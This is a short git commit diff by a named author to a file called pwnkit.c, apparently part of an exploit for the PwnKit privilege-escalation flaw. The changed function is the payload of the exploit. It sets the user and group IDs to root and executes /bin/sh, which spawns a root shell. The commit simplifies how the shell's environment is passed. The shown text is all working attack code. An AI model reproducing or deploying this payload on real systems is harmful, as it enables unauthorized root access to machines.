42544b4b45a10e28677100d97c94e75c700b1a04
antoineghigny <antoine@ghigny.be>
2022-11-30 23:08:22 +0100

    update code

--- 56359/Code/PwnKit/pwnkit.c
+++ 56359/Code/PwnKit/pwnkit.c
@@ -8,9 +8,8 @@ void gconv(void) {
 void gconv_init(void *step)
 {
 	char * const args[] = { "/bin/sh", NULL };
-	char * const environ[] = { "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin", NULL };
 	setuid(0);
 	setgid(0);
-	execve(args[0], args, environ);
+	execve(args[0], args, NULL);
 	exit(0);
 }
